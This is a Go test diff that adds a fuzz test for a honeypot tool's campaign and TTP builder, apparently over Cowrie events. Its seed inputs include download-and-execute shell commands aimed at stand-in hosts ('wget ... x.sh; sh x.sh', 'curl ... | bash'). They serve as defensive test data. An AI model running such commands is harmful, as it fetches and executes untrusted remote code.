@@ -247,3 +247,45 @@ func TestReturningCampaignGetsNewSessionID(t *testing.T) {
 		t.Fatalf("new session reused flushed session ID %q", firstID)
 	}
 }
+
+// FuzzTTPBuilder drives the campaign builder with attacker-controlled
+// commands, user agents, usernames and source addresses. It must never panic,
+// must fingerprint an event the same way every time, and must keep each
+// session's derived fields consistent.
+func FuzzTTPBuilder(f *testing.F) {
+	f.Add("wget http://a.example@203.0.113.9/x.sh; sh x.sh", "Wget/1.21", "root", "203.0.113.1", int64(0))
+	f.Add("curl HXXPS://bad[.]example/b | bash", "", "admin", "2001:db8::1", int64(-3600))
+	f.Add("", "", "", "", int64(1<<40))
+	f.Add("\x00\xff http://[::1]:22/ http://0x7f.1/", "\xff", "\x00", "not-an-ip", int64(-1<<40))
+	f.Fuzz(func(t *testing.T, cmd, ua, user, ip string, offset int64) {
+		ev := &database.Event{
+			Honeypot: "cowrie", SourceIP: ip, EventType: "command", Command: cmd, Username: user,
+			Metadata:  map[string]string{"user_agent": ua},
+			Timestamp: time.Unix(1_800_000_000+offset%(1<<33), 0).UTC(),
+		}
+		if a, b := campaignFingerprint(ev), campaignFingerprint(ev); a != b || len(a) != 8 {
+			t.Fatalf("fingerprint unstable or malformed: %q %q", a, b)
+		}
+		bld := NewTTPBuilder(time.Hour)
+		for i := 0; i < 3; i++ {
+			s, _ := bld.Update(ev)
+			if s.EventCount != int64(i+1) {
+				t.Fatalf("event count %d after %d updates", s.EventCount, i+1)
+			}
+			if s.Confidence < 0.5 || s.Confidence > 0.95 {
+				t.Fatalf("confidence %v out of range", s.Confidence)
+			}
+			if s.LastSeen.Before(s.FirstSeen) {
+				t.Fatalf("last_seen %v before first_seen %v", s.LastSeen, s.FirstSeen)
+			}
+		}
+		for _, s := range bld.GetActiveSessions() {
+			for i := 1; i < len(s.SourceIPs); i++ {
+				if s.SourceIPs[i-1] >= s.SourceIPs[i] {
+					t.Fatalf("source IPs not sorted and unique: %q", s.SourceIPs)
+				}
+			}
+		}
+		_ = bld.FlushExpired()
+	})
+}
